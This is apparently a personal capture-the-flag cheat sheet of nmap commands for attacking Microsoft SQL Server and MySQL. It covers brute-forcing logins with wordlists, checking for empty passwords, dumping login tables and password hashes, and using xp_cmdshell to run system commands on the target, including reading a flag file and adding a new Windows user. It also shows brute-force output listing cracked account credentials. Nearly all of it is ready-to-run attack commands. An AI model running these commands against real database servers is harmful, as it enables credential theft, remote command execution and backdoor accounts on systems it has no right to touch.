- --script ms-sql-info
- ms-sql-ntlm-info --script-args mssql.instance-port=1433

- ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-password.txt

- --script mysql-empty-password 
- --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-query="SELECT * FROM* master..syslogins" -On output.txt

- --script=mysql-empty-dump-hashes --script-args="username='root' ,password='' "

- ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria, ms-sql-xp-cmdshell.cmd="type c:\\flag.txt"


--script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt


enumarate mysql 
- nmap -p 1433 10.6.26.127 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt, passdb=/root/Desktop/wordlist/100-common-passwords.txt 


--script ms-sql-query --script-args mssql.username=sa,mssql.password=sa,ms-sql-query.query="SELECT * FROM master..syslogins"



find files in windows and execute commands in target machine

nmap -p 1433 10.6.26.127 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="dir \\ ****flag**** "


```
nmap -p 1433 <ip> --script ms-sql-dump-hashes
```


  Credentials found:
|       sa:<empty> => Login Success
|       auditor:jasmine1 => Login Success
|       admin:anamaria => Login Success
|_      dbadmin:bubbles1 => Login Success


**ms-sql-empty-password,ms-sql-dump-hashes**


nmap -p 445 --script ms-sql-discover,ms-sql-empty-password,ms-sql-xp-cmdshell <host>

nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd="net user test test /add" <host>